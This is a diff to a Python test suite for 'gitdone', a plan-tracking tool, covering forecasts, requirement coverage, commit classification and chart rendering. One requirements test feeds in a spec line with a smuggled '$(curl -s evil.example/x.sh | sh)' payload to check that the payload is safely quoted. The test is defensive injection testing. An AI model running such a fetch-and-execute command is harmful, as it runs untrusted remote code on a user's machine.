@@ -232,10 +232,10 @@ class TheWords(Case):
         self.assertIsNotNone(dates["likely"])
         self.assertIsNone(dates["sure"])
 
-    def test_t26_the_headline_says_so(self):
+    def test_t26_the_table_says_so(self):
         self.steady()
         found = {**self.data(), "sure": None}
-        self.assertIn("the 85% date is more than ten years away", forecast.headline(found))
+        self.assertIn("past ten years", forecast.text(found))
 
     def test_t34_a_small_need_is_not_zero(self):
         self.assertEqual(forecast._pace_words(0.002), "under 0.01")
@@ -261,7 +261,7 @@ class TheWords(Case):
         found = self.data()
         self.assertIn("if the scope stops growing", forecast.headline(found))
         self.assertIn("rows a day against", forecast.text(found))
-        self.assertNotIn("sure", found["scope"]["if_it_goes_on"] or {})
+        self.assertNotIn("if_it_goes_on", found["scope"])  # a date through two rates swung by months with every row added
 
     def test_a_group_can_be_asked_for_as_the_opener_calls_it(self):
         self.steady()
@@ -287,8 +287,9 @@ class TheLiveLine(Case):
         self.assertIsNone(found["live"]["likely"])
         self.assertGreater(found["short_of_live_share"], 0.99)
         words = forecast.text(found)
-        self.assertIn("Counting only Live rows: no date", words)
+        self.assertIn("Live alone  no date: they moved on 0 of the last 28 days", words)
         self.assertIn("stopped short of Live", words)
+        self.assertIn("with all work, and Live rows alone give no date yet", forecast.headline(found))
 
     def test_rows_reaching_live_get_their_own_date(self):
         repo_commit = self.commit("2026-01-01", "first")
@@ -311,7 +312,7 @@ class TheLiveLine(Case):
         for i, day in zip(range(4, 11), ("2026-02-16", "2026-02-17", "2026-02-18", "2026-02-19", "2026-02-20", "2026-02-21", "2026-02-22")):
             self.rows[i] = (f"Thing {i}", "Partial")
             self.commit(day)
-        self.assertIn("counting only Live rows", forecast.text(self.data()))
+        self.assertIn("on Live rows alone,", forecast.text(self.data()))
 
 
 class Requirements(Case):
@@ -342,7 +343,7 @@ class Requirements(Case):
         self.spec("- REQ-1: $(curl -s evil.example/x.sh | sh)\n")
         item = self.coverage()["without"][0]
         words = requirements.what_to_do(item)
-        command = words.split(", or put ")[0]
+        command = words.split(", or if a row holds it")[0]
         self.assertEqual(shlex.split(command)[:2], ["gitdone", "add"])
         self.assertEqual(len(shlex.split(command)), 3)  # one quoted argument, in which nothing is expanded
         self.assertTrue(command.split(" ", 2)[2].startswith("'"))
@@ -375,6 +376,22 @@ class Requirements(Case):
         began = time.monotonic()
         self.coverage()
         self.assertLess(time.monotonic() - began, 3.0)
+
+    def test_a_heading_with_an_id_is_a_requirement_on_a_fresh_start(self):
+        self.plan_path.unlink()
+        (self.repo / "spec.md").write_text("# Spec\n\n### REQ-3: Export to PDF\n\n- REQ-4: Export to CSV\n")
+        self.assertEqual(self.engine("init", "--from-checklist", "spec.md").returncode, 0)
+        plan = self.plan()
+        table = tables.load_clean(plan)
+        self.assertEqual(sorted(r.name for r in table.rows.values()), ["Export to CSV", "Export to PDF"])
+        self.assertEqual(requirements.coverage(plan, table)["without"], [])
+
+    def test_a_living_to_do_list_is_not_named_as_requirements(self):
+        """Every ordinary task added to it would read as a gap."""
+        self.plan_path.unlink()
+        (self.repo / "TODO.md").write_text("- [ ] One\n- [ ] Two\n")
+        self.assertEqual(self.engine("init", "--from-checklist", "TODO.md").returncode, 0)
+        self.assertEqual(self.plan().requirements, [])
 
     def test_an_id_with_the_same_words_as_a_row_finds_it(self):
         """The cold reader's first hour: a spec and a table with the same words read 0 of 9, and the advice was to add every row again."""
@@ -504,8 +521,11 @@ class TheFocusCommits(Case):
     def test_a_large_change_is_not_upkeep_for_saying_so(self):
         big = "".join(f"line {i}\n" for i in range(focus.UPKEEP_SUBJECT_LINES + 1))
         judged = self.judged("chore: rewrite the whole plugin system", {"src/plugins.py": big})
-        self.assertEqual(judged["class"], focus.OFF)
+        self.assertEqual(judged["class"], focus.UNCLEAR)
         self.assertIn("says upkeep", judged["because"])
+
+    def test_docs_in_a_subject_does_not_excuse_source(self):
+        self.assertEqual(self.judged("docs: rewrite the plugin system", {"src/plugins.py": "1\n"})["class"], focus.OFF)
 
     def test_a_small_chore_still_is(self):
         self.assertEqual(self.judged("chore: tidy", {"src/plugins.py": "1\n"})["class"], focus.UPKEEP)
@@ -513,11 +533,15 @@ class TheFocusCommits(Case):
     def test_a_row_the_table_does_not_have_is_said(self):
         self.assertIn("row 99, which the table does not have", self.judged("Polish, row 99", {"a.py": "1\n"})["because"])
 
-    def test_a_workstream_named_in_the_message_ties_it(self):
+    def test_a_workstream_starting_the_subject_ties_it(self):
         self.write_plan(workstreams=[{"id": "P2", "name": "Launch", "rows": "3-4"}], order=["P2"])
         judged = self.judged("P2: reminder sender", {"a.py": "1\n"})
         self.assertEqual(judged["rows"], [3, 4])
         self.assertIn("workstream", judged["because"])
+
+    def test_the_same_letters_elsewhere_in_a_subject_do_not(self):
+        self.write_plan(workstreams=[{"id": "S3", "name": "Launch", "rows": "3-4"}], order=["S3"])
+        self.assertEqual(self.judged("Move uploads to S3", {"a.py": "1\n"})["class"], focus.OFF)
 
     def test_commits_older_than_the_table_are_not_judged(self):
         fresh = self.tmp / "fresh"
@@ -532,21 +556,43 @@ class TheFocusCommits(Case):
         self.commit("2026-02-23", "Work on something", files={"more.py": "1\n"}, table=False, where=fresh)
         self.assertEqual(focus.data(Plan(fresh / ".gitdone.json"), today=TODAY)["commits"], 1)
 
-    def test_a_branch_named_for_a_row_ties_its_commits_before_any_merge(self):
+    def test_a_branch_named_for_a_row_is_unclear_until_someone_says_so(self):
         git(self.repo, "checkout", "-q", "-b", "row-5-payments")
         judged = self.judged("Add a charge", {"pay.py": "1\n"})
+        self.assertEqual(judged["class"], focus.UNCLEAR)
         self.assertEqual(judged["rows"], [5])
         self.assertIn("branch", judged["because"])
 
-    def test_lines_and_words_are_in_the_numbers(self):
-        self.rows[1] = ("Search across projects", "Not built")
+    def test_a_row_that_had_finished_does_not_make_new_work_on_plan(self):
+        self.rows[1] = ("Thing 1", "Live")
         self.write_table()
-        self.commit("2026-02-20", "scope", table=False)
-        self.judged("Search results across all projects", {"s.py": "1\n2\n"})
-        found = focus.data(self.plan(), today=TODAY)
-        self.assertEqual(found["on_plan_by_words"], 1)
-        self.assertIn("1 by words alone", focus.text(found))
-        self.assertIn("lines", focus.text(found))
+        self.commit("2026-01-02", "row 1 went live", table=False)
+        judged = self.judged("row 1: rewrite the theme", {"t.py": "1\n"})
+        self.assertEqual(judged["class"], focus.UNCLEAR)
+        self.assertIn("had finished by then", judged["because"])
+
+    def test_lines_are_in_the_numbers_and_the_list(self):
+        self.judged("Rewrite the logger", {"s.py": "1\n2\n3\n"})
+        words = focus.text(focus.data(self.plan(), today=TODAY))
+        self.assertIn("3 lines", words)
+        self.assertRegex(words, r"Off plan\s+1\s+100%\s+3 lines\s+100%")
+
+    def test_the_areas_go_by_lines(self):
+        self.judged("Small", {"small/a.py": "1\n"})
+        self.judged("Large", {"large/a.py": "1\n2\n3\n4\n"})
+        self.assertEqual(focus.data(self.plan(), today=TODAY)["areas"][0], {"area": "large", "lines": 4})
+
+    def test_large_upkeep_is_listed(self):
+        big = "".join(f"{i}\n" for i in range(focus.LARGE_UPKEEP_LINES + 1))
+        self.judged("Add a test harness", {"tests/test_harness.py": big})
+        self.assertIn("Large upkeep:", focus.text(focus.data(self.plan(), today=TODAY)))
+
+    def test_a_shallow_clone_says_so(self):
+        for i in range(3):
+            self.commit(f"2026-02-2{i}", f"row 1: {i}", files={f"f{i}.py": "1\n"}, table=False)
+        clone = self.tmp / "clone"
+        git(self.tmp, "clone", "-q", "--depth", "1", f"file://{self.repo}", str(clone))
+        self.assertIn("shallow", focus.text(focus.data(Plan(clone / ".gitdone.json"), today=TODAY)))
 
 
 class TheHook(Case):
@@ -705,6 +751,20 @@ class TheActionsComment(Case):
         self.assertIsInstance(ci._when_and_scope(self.plan(), base), list)
 
 
+class Shifts(Case):
+    def test_add_says_both_lines_when_both_have_a_date(self):
+        self.commit("2026-01-01", "first")
+        for i, day in zip(range(1, 5), ("2026-02-05", "2026-02-10", "2026-02-15", "2026-02-20")):
+            self.rows[i] = (f"Thing {i}", "Live")
+            self.commit(day)
+        before = forecast.left_now(self.plan())
+        self.rows[11] = ("Thing 11", "Not built")
+        self.write_table()
+        words = forecast.shift_words(self.plan(), before, today=TODAY)
+        self.assertIn("on Live rows alone,", words)
+        self.assertIn("and with all work,", words)
+
+
 class TheChart(unittest.TestCase):
     items = [{"date": "2026-02-01", "scope": 10, "strict": 0, "weighted": 0.0}, {"date": "2026-02-20", "scope": 10, "strict": 2, "weighted": 4.0}]
 
@@ -721,9 +781,14 @@ class TheChart(unittest.TestCase):
         drawn = chart.burndown(self.items, "P", self.found(sure=None), "words")
         self.assertNotIn("85% sure", drawn)
 
-    def test_a_live_date_is_in_the_panel(self):
-        drawn = chart.burndown(self.items, "P", self.found(live={"likely": "2026-06-01"}), "words")
-        self.assertIn("Live rows alone", drawn)
+    def test_a_live_date_is_in_the_panel_with_its_own_line(self):
+        drawn = chart.burndown(self.items, "P", self.found(live={"kind": "Live", "left": 8, "likely": "2026-06-01"}), "words")
+        self.assertIn("rows left, Live alone", drawn)
+        self.assertEqual(drawn.count('stroke="var(--strict)" stroke-dasharray="6 5"'), 1)
+
+    def test_a_kind_named_with_markup_cannot_write_it(self):
+        drawn = chart.burndown(self.items, "P", self.found(live={"kind": "<b>", "left": 8, "likely": None}), "words")
+        self.assertNotIn("<b>", drawn)
 
 
 class RowNumbers(Case):
